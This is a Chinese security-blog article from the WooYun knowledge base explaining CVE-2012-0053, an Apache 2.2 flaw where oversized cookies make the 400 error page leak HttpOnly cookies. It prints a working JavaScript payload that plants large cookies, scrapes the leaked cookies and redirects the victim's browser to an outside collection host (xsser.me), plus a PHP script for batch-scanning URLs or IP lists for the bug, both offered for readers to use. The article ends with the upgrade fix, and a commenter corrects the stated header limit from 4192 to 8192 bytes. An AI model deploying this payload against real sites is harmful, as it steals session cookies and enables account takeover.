<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">CVE-2012-0053详解</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">VIP</a> <span class="bull">·</span> <time title="2013/08/15 15:25" ui-time="" datetime="2013/08/15 15:25" class="published ng-binding ng-isolate-scope">2013/08/15 15:25</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>Apache服务器2.2.0-2.2.21版本存在一个漏洞（CVE-2012-0053），攻击者可通过给网站植入超大的Cookie，使得HTTP头超过apache的LimitRequestFieldSize（最大请求长度）4192字节，apache便会返回400错误，状态页中就包含了http-only保护的cookies。</p><h2>0x01 详情</h2><hr><p>老外在exploit-db上公布了测试apache站点是否有这个问题的js代码。</p><p><a href="http://www.exploit-db.com/exploits/18442/">http://www.exploit-db.com/exploits/18442/</a></p><p>代码稍微改一下就可以是一个收取cookie的exp了，看一下xsser.me的模块：</p><pre><code>#!javascript
function setCookies() {
    /*apache server limit 8192*/
    var str = "";
    for (var i = 0; i &lt; 819; i++) {
        str += "x";
    }
    for (i = 0; i &lt; 10; i++) {
        var cookie = "ray" + i + "=" + str + ";path=/";
        document.cookie = cookie;
    }
}
function parseCookies() {
    if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {
        var content = xhr.responseText.replace(/\r|\n/g, '').match(/&lt;pre&gt;(.+)&lt;\/pre&gt;/);
        content = content[1].replace("Cookie: ", "");
        cookies = content.replace(/ray\d=x+;?/g, '') try {
            var myopener = '';
            myopener = window.parent.openner.location;
            var myparent = '';
            myparent = window.parent.location;
        } catch(err) {
            myopener = '0';
            myparent = '0';
        }
        window.location = 'http://xsser.me/index.php?do=api&amp;id={projectId}&amp;location=' + escape(document.location) + '&amp;toplocation=' + escape(myparent) + '&amp;cookie=' + escape(cookies) + '&amp;opener=' + escape(myopener);
    }
}
setCookies();
var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest();
xhr.onreadystatechange = parseCookies;
xhr.open("POST", "/?" + Math.random(), true);
xhr.send(null);
</code></pre><p>在执行这段代码后，会种下10个819字节长的cookie，使得请求头超过最大请求长度，然后发起一次POST请求，待服务器返回400错误后从状态页中正则提取出经http-only保护的cookies。</p><p><img alt="2013081413015999698.png" img-src="ad1a7e8fafe582d10864d9520cf0844830e33faf.jpg"></p><h2>0x02 危害</h2><hr><p>关于此漏洞的利用，乌云上也有相关案例，如：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-06947">WooYun: 腾讯分站 Apache 漏洞</a></p><p>其实最经典的案例要数这个了：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-09777">WooYun: XSS漏洞渗透新浪微博《头条新闻》账号</a></p><p>微博本身重要的cookie都设置了httponly，但是有一个域名下有这个apache漏洞。</p><p>刚好也有一个flash的xss，导致了此事件的发生。</p><h2>0x03 后续</h2><hr><p>这个漏洞再次证明了：</p><p>本来是一个正常的功能，可因为设计不当成了XSS的帮凶。</p><p>下面的代码是之前的简单的写了一个验证是否存在这个漏洞的php脚本。</p><p>各位有需要的可以拿去使用下，现在估计存在这个问题的不多了，去年刚出来的时候可是大片存在。</p><pre><code>#!php
&lt;?php

//生成构造特殊cookie
function cookie () {
    $str = "";
    for ($i=0; $i&lt; 819; $i++) {
        $str .= "x";
    }
    $cookie= "secdragon=secdragon;path=/";
    for ($i = 0; $i &lt; 10; $i++) {
         $cookie .= "xss".$i."=".$str.";path=/";
    }
    return $cookie;
    }

//获取url，发包判断返回状态及结果
function my_get_http_result($url){
    if (empty($url)){
      return false;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_COOKIE, cookie());
    $result = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    if( $info['http_code'] == "400" )
        return $result;
    else{
        return '';
    }
}

//判断是否成功获取cookie
function check($url){
    $a=my_get_http_result($url);
    if(strpos($a,'secdragon=secdragon'))
        echo $url.':success!'."&lt;br/&gt;";
    else{
        echo $url.':failed!'."&lt;br/&gt;";
    }
}

//获取需检测ip，也可将ip放在同目录下的ip.txt中，一行一个ip
$url=(@$_GET['url'])?$_GET['url']:@$argv[1];
if(!$url){
    $fp=fopen('ip.txt','r+');
    while($ipstr=fgets($fp)){
        if(preg_match('#[\w\.]+#',$ipstr,$match)){
            check($match[0]);
        }
    }
}else{
    check($url);
}

?&gt;
</code></pre><h2>0x04修复方式</h2><p>Apache2.2.22及以上版本已经修复此问题，升级即可解决。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/104" rel="bookmark" id="re1">Clickjacking简单介绍</a></li><li><a href="http://drops.wooyun.org/tips/2834" rel="bookmark" id="re2">HttpOnly 隐私嗅探器</a></li><li><a href="http://drops.wooyun.org/tools/601" rel="bookmark" id="re3">跑wordpress用户密码脚本</a></li><li><a href="http://drops.wooyun.org/papers/12645" rel="bookmark" id="re4">中间人攻击 -- Cookie喷发</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">onlinecasinogames.rocks</span> <span class="reply-time">2014-10-03 19:15:16</span></div><p></p><p><strong>onlinecasinogames.rocks...</strong></p><p>CVE-2012-0053详解 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">research.accessinitiative.org</span> <span class="reply-time">2014-10-01 05:39:24</span></div><p></p><p><strong>research.accessinitiative.org...</strong></p><p>CVE-2012-0053详解 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2013-08-16 13:38:18</span></div><p></p><p>VIP 卖萌</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">VIP</span> <span class="reply-time">2013-08-16 13:21:15</span></div><p></p><p>确实是，似乎我打错了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">VIP</span> <span class="reply-time">2013-08-16 13:20:33</span></div><p></p><p>感谢啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">n3wF</span> <span class="reply-time">2013-08-15 21:27:13</span></div><p></p><p>使得HTTP头超过apache的LimitRequestFieldSize（最大请求长度）4192字节</p><p>这里应该是8192字节吧？ ^_^</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2013-08-15 15:29:10</span></div><p></p><p>@VIP 小伙子想到的点不错，不过每次都写得太简略了，这次又帮你补充了些，建议以后对某个问题研究的再透彻些，再投稿过来，小伙子加油哦 :)</p><p></p></div></div></div></div></div></main>